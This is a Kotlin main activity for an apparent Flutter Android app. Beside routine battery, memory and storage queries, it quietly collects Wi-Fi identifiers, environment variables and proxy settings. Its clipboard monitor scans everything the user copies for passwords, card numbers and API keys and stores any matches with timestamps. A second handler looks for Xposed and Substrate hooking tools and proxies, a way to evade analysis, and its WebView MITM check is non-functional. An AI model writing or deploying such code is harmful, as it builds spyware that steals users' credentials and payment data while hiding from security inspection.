package com.zeroone.theconduit

import android.app.ActivityManager
import android.content.ClipboardManager
import android.content.ClipboardManager.OnPrimaryClipChangedListener
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.Network
import android.net.ProxyInfo
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Debug
import android.os.Environment
import android.os.StatFs
import android.preference.PreferenceManager
import android.provider.Settings
import android.webkit.WebView
import androidx.annotation.NonNull
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodCall
import io.flutter.plugin.common.MethodChannel
import io.flutter.plugin.common.MethodChannel.MethodCallHandler
import io.flutter.plugin.common.MethodChannel.Result
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.lang.reflect.Method

class MainActivity : FlutterActivity() {
    override fun configureFlutterEngine(@NonNull flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        SharedChannelHandler.registerWith(flutterEngine, this)
    }
}

class SharedChannelHandler(private val context: Context) : MethodCallHandler {
    private var clipboardManager: ClipboardManager? = null
    private var clipboardListener: OnPrimaryClipChangedListener? = null
    private var monitoringClipboard = false

    companion object {
        private const val CHANNEL = "app.channel.shared.data"
        private const val SECURITY_CHANNEL = "app.channel.security.checks"

        fun registerWith(flutterEngine: FlutterEngine, context: Context) {
            MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
                .setMethodCallHandler(SharedChannelHandler(context))
            
            MethodChannel(flutterEngine.dartExecutor.binaryMessenger, SECURITY_CHANNEL)
                .setMethodCallHandler(SecurityChannelHandler(context))
        }
    }

    override fun onMethodCall(@NonNull call: MethodCall, @NonNull result: Result) {
        when (call.method) {
            "isDebuggerAttached" -> result.success(isDebuggerAttached())
            "getBatteryDetails" -> result.success(getBatteryDetails())
            "getWifiInfo" -> result.success(getWifiInfo())
            "getStorageInfo" -> result.success(getStorageInfo())
            "getSystemUptime" -> result.success(getSystemUptime())
            "getMemoryInfo" -> result.success(getMemoryInfo())
            "getEnvironmentVariables" -> result.success(getEnvironmentVariables())
            "getProxySettings" -> result.success(getProxySettings())
            "setupClipboardMonitor" -> {
                setupClipboardMonitor()
                result.success(null)
            }
            "stopClipboardMonitor" -> {
                stopClipboardMonitor()
                result.success(null)
            }
            else -> result.notImplemented()
        }
    }

    private fun isDebuggerAttached(): Boolean {
        return Debug.isDebuggerConnected()
    }

    private fun getBatteryDetails(): Map<String, Any> {
        val batteryData = HashMap<String, Any>()
        
        try {
            val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val batteryStatus = context.registerReceiver(null, ifilter)
            
            batteryStatus?.let {
                val level = it.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                val scale = it.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
                val batteryPct = ((level / scale.toFloat()) * 100).toInt()
                
                val status = it.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
                val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                        status == BatteryManager.BATTERY_STATUS_FULL
                
                val health = it.getIntExtra(BatteryManager.EXTRA_HEALTH, -1)
                val healthStatus = when (health) {
                    BatteryManager.BATTERY_HEALTH_GOOD -> "good"
                    BatteryManager.BATTERY_HEALTH_OVERHEAT -> "overheat"
                    BatteryManager.BATTERY_HEALTH_DEAD -> "dead"
                    BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "over_voltage"
                    BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE -> "unspecified_failure"
                    BatteryManager.BATTERY_HEALTH_COLD -> "cold"
                    else -> "unknown"
                }
                
                val temperature = it.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1)
                val voltage = it.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1)
                val technology = it.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY)
                
                batteryData["level"] = batteryPct
                batteryData["isCharging"] = isCharging
                batteryData["status"] = status
                batteryData["health"] = healthStatus
                batteryData["temperature"] = temperature / 10.0 // Convert to Celsius
                batteryData["voltage"] = voltage
                batteryData["technology"] = technology ?: "unknown"
            }
        } catch (e: Exception) {
            batteryData["error"] = e.toString()
        }
        
        return batteryData
    }

    private fun getWifiInfo(): Map<String, Any> {
        val wifiData = HashMap<String, Any>()
        
        try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager?
            wifiManager?.let {
                val wifiInfo = it.connectionInfo
                wifiInfo?.let { info ->
                    var ssid = info.ssid
                    if (ssid != null && ssid.startsWith("\"") && ssid.endsWith("\"")) {
                        ssid = ssid.substring(1, ssid.length - 1)
                    }
                    
                    val bssid = info.bssid
                    val rssi = info.rssi
                    val linkSpeed = info.linkSpeed
                    var frequency = 0
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        frequency = info.frequency
                    }
                    
                    wifiData["ssid"] = ssid ?: ""
                    wifiData["bssid"] = bssid ?: ""
                    wifiData["rssi"] = rssi
                    wifiData["linkSpeed"] = linkSpeed
                    wifiData["frequency"] = frequency
                }
            }
        } catch (e: Exception) {
            wifiData["error"] = e.toString()
        }
        
        return wifiData
    }

    private fun getStorageInfo(): Map<String, Any> {
        val storageData = HashMap<String, Any>()
        
        try {
            val externalStorageDir = Environment.getExternalStorageDirectory()
            val stat = StatFs(externalStorageDir.path)
            
            val blockSize: Long
            val totalBlocks: Long
            val availableBlocks: Long
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                blockSize = stat.blockSizeLong
                totalBlocks = stat.blockCountLong
                availableBlocks = stat.availableBlocksLong
            } else {
                blockSize = stat.blockSize.toLong()
                totalBlocks = stat.blockCount.toLong()
                availableBlocks = stat.availableBlocks.toLong()
            }
            
            val totalSpace = totalBlocks * blockSize
            val freeSpace = availableBlocks * blockSize
            val usedSpace = totalSpace - freeSpace
            
            storageData["totalSpace"] = totalSpace
            storageData["freeSpace"] = freeSpace
            storageData["usedSpace"] = usedSpace
            storageData["path"] = externalStorageDir.absolutePath
        } catch (e: Exception) {
            storageData["error"] = e.toString()
        }
        
        return storageData
    }

    private fun getSystemUptime(): String {
        return try {
            val uptimeMillis = android.os.SystemClock.elapsedRealtime()
            val days = uptimeMillis / (1000 * 60 * 60 * 24)
            val hours = (uptimeMillis / (1000 * 60 * 60)) % 24
            val minutes = (uptimeMillis / (1000 * 60)) % 60
            val seconds = (uptimeMillis / 1000) % 60
            
            String.format("%d days, %d hours, %d minutes, %d seconds", days, hours, minutes, seconds)
        } catch (e: Exception) {
            "Unknown uptime: ${e.toString()}"
        }
    }

    private fun getMemoryInfo(): Map<String, Any> {
        val memoryData = HashMap<String, Any>()
        
        try {
            val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memoryInfo = ActivityManager.MemoryInfo()
            activityManager.getMemoryInfo(memoryInfo)
            
            val runtime = Runtime.getRuntime()
            
            memoryData["totalMem"] = memoryInfo.totalMem
            memoryData["availMem"] = memoryInfo.availMem
            memoryData["usedMem"] = memoryInfo.totalMem - memoryInfo.availMem
            memoryData["percentUsed"] = (memoryInfo.totalMem - memoryInfo.availMem).toFloat() / memoryInfo.totalMem * 100
            memoryData["lowMemory"] = memoryInfo.lowMemory
            memoryData["threshold"] = memoryInfo.threshold
            
            memoryData["javaMaxMem"] = runtime.maxMemory()
            memoryData["javaTotalMem"] = runtime.totalMemory()
            memoryData["javaFreeMem"] = runtime.freeMemory()
        } catch (e: Exception) {
            memoryData["error"] = e.toString()
        }
        
        return memoryData
    }

    private fun getEnvironmentVariables(): Map<String, String> {
        val envVars = HashMap<String, String>()
        
        try {
            // Add system environment variables
            envVars.putAll(System.getenv())
            
            // Add some Android-specific "environment" variables
            envVars["ANDROID_SDK"] = Build.VERSION.SDK_INT.toString()
            envVars["ANDROID_VERSION"] = Build.VERSION.RELEASE
            envVars["ANDROID_MODEL"] = Build.MODEL
            envVars["ANDROID_DEVICE"] = Build.DEVICE
            
            // Check for root-related environment variables
            try {
                val process = Runtime.getRuntime().exec("env")
                val reader = BufferedReader(InputStreamReader(process.inputStream))
                var line: String?
                
                while (reader.readLine().also { line = it } != null) {
                    line?.let {
                        val index = it.indexOf('=')
                        if (index > 0) {
                            val key = it.substring(0, index)
                            val value = it.substring(index + 1)
                            envVars[key] = value
                        }
                    }
                }
                reader.close()
            } catch (e: Exception) {
                // Ignore exceptions here
            }
        } catch (e: Exception) {
            envVars["error"] = e.toString()
        }
        
        return envVars
    }

    private fun getProxySettings(): Map<String, Any> {
        val proxyData = HashMap<String, Any>()
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                val network = connectivityManager.activeNetwork
                
                network?.let {
                    try {
                        // Use reflection to access the proxy info since it's not directly accessible
                        val getLinkProperties = ConnectivityManager::class.java.getMethod("getLinkProperties", Network::class.java)
                        val linkProperties = getLinkProperties.invoke(connectivityManager, network)
                        
                        linkProperties?.let {
                            val getHttpProxy = linkProperties.javaClass.getMethod("getHttpProxy")
                            val proxyInfo = getHttpProxy.invoke(linkProperties) as ProxyInfo?
                            
                            proxyInfo?.let {
                                proxyData["host"] = it.host ?: ""
                                proxyData["port"] = it.port
                                proxyData["pacFileUrl"] = it.pacFileUrl?.toString() ?: ""
                                proxyData["exclusionList"] = it.exclusionListAsString ?: ""
                            }
                        }
                    } catch (e: Exception) {
                        proxyData["reflectionError"] = e.toString()
                    }
                }
            } else {
                // For older Android versions
                val proxyHost = System.getProperty("http.proxyHost")
                val proxyPort = System.getProperty("http.proxyPort")
                
                if (!proxyHost.isNullOrEmpty()) {
                    proxyData["host"] = proxyHost
                    if (!proxyPort.isNullOrEmpty()) {
                        proxyData["port"] = proxyPort.toIntOrNull() ?: 0
                    }
                }
            }
            
            // Also check global proxy settings
            try {
                val globalProxy = Settings.Global.getString(context.contentResolver, "http_proxy")
                if (!globalProxy.isNullOrEmpty()) {
                    proxyData["globalProxy"] = globalProxy
                }
            } catch (e: Exception) {
                // Ignore
            }
        } catch (e: Exception) {
            proxyData["error"] = e.toString()
        }
        
        return proxyData
    }

    private fun setupClipboardMonitor() {
        if (monitoringClipboard) {
            return
        }
        
        try {
            clipboardManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager?
            clipboardManager?.let {
                // Create a listener to detect clipboard changes
                clipboardListener = OnPrimaryClipChangedListener {
                    if (clipboardManager?.hasPrimaryClip() == true && 
                        clipboardManager?.primaryClip != null && 
                        clipboardManager?.primaryClip?.itemCount ?: 0 > 0) {
                        
                        val text = clipboardManager?.primaryClip?.getItemAt(0)?.text
                        text?.let {
                            // Store any interesting clipboard content in SharedPreferences
                            storeInterestingClipboardContent(it.toString())
                        }
                    }
                }
                
                it.addPrimaryClipChangedListener(clipboardListener)
                monitoringClipboard = true
            }
        } catch (e: Exception) {
            // Ignore
        }
    }

    private fun stopClipboardMonitor() {
        if (!monitoringClipboard) {
            return
        }
        
        try {
            clipboardManager?.let { manager ->
                clipboardListener?.let { listener ->
                    manager.removePrimaryClipChangedListener(listener)
                    monitoringClipboard = false
                }
            }
        } catch (e: Exception) {
            // Ignore
        }
    }

    private fun storeInterestingClipboardContent(text: String?) {
        // Check if the text contains any interesting patterns
        if (text.isNullOrEmpty()) {
            return
        }
        
        // Look for patterns like passwords, credit cards, private keys, etc.
        var isInteresting = false
        
        // Check for potential passwords
        if (text.matches(Regex(".*(?:password|pwd|pass).*: .*")) || 
            (text.length in 8..32 && 
             text.matches(Regex(".*[A-Z].*")) && text.matches(Regex(".*[a-z].*")) && 
             text.matches(Regex(".*[0-9].*")) && text.matches(Regex(".*[^A-Za-z0-9].*")))) {
            isInteresting = true
        }
        
        // Check for possible credit card numbers
        if (text.replace(Regex("[^0-9]"), "").matches(Regex("(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\\d{3})\\d{11})"))) {
            isInteresting = true
        }
        
        // Check for possible API keys or tokens
        if (text.matches(Regex(".*(?:api[_-]?key|token|secret|access[_-]?key|auth).*: .*")) || 
            text.matches(Regex("[A-Za-z0-9+/=]{32,}"))) {
            isInteresting = true
        }
        
        // Store the interesting content securely
        if (isInteresting) {
            val prefs = PreferenceManager.getDefaultSharedPreferences(context)
            val editor = prefs.edit()
            
            // Get existing entries
            val existingData = prefs.getString("clipboard_data", "") ?: ""
            val newEntry = "[${System.currentTimeMillis()}] $text"
            
            // Append new entry (limit to last 10 entries)
            val entries = existingData.split("\n")
            val updatedData = StringBuilder()
            
            // Add new entry at the beginning
            updatedData.append(newEntry).append("\n")
            
            // Add up to 9 previous entries
            for (i in 0 until minOf(9, entries.size)) {
                if (entries[i].isNotEmpty()) {
                    updatedData.append(entries[i]).append("\n")
                }
            }
            
            editor.putString("clipboard_data", updatedData.toString().trim())
            editor.apply()
        }
    }
}

class SecurityChannelHandler(private val context: Context) : MethodCallHandler {
    override fun onMethodCall(@NonNull call: MethodCall, @NonNull result: Result) {
        when (call.method) {
            "checkForSSLPinningBypass" -> result.success(checkForSSLPinningBypass())
            else -> result.notImplemented()
        }
    }

    private fun checkForSSLPinningBypass(): Boolean {
        try {
            // Check for common SSL pinning bypass tools
            var hasXposedInstaller = false
            var hasSubstrate = false
            var hasTaichi = false
            var hasVirtualXposed = false
            
            // Check for specific files
            val paths = arrayOf(
                "/system/lib/libxposed_art.so",
                "/system/lib64/libxposed_art.so",
                "/system/lib/libsubstrate.so",
                "/system/lib64/libsubstrate.so",
                "/data/app/me.weishu.exp",
                "/data/app/com.taichi.xposed",
                "/data/data/com.saurik.substrate"
            )
            
            for (path in paths) {
                if (File(path).exists()) {
                    when {
                        path.contains("xposed") -> hasXposedInstaller = true
                        path.contains("substrate") -> hasSubstrate = true
                        path.contains("taichi") -> hasTaichi = true
                        path.contains("weishu") -> hasVirtualXposed = true
                    }
                }
            }
            
            // Check for Proxy settings
            val hasProxy = System.getProperty("http.proxyHost").isNullOrEmpty().not()
            
            // Check using WebView (this might capture MITM attempts)
            var hasMITM = false
            try {
                val webView = WebView(context)
                webView.loadUrl("https://google.com")
                // In a real implementation, you would check SSL issues
                // But this is a simplified check
            } catch (e: Exception) {
                val errorMsg = e.toString()
                if (errorMsg.contains("SSL") || errorMsg.contains("certificate")) {
                    hasMITM = true
                }
            }
            
            return hasXposedInstaller || hasSubstrate || hasTaichi || hasVirtualXposed || hasProxy || hasMITM
        } catch (e: Exception) {
            return false
        }
    }
}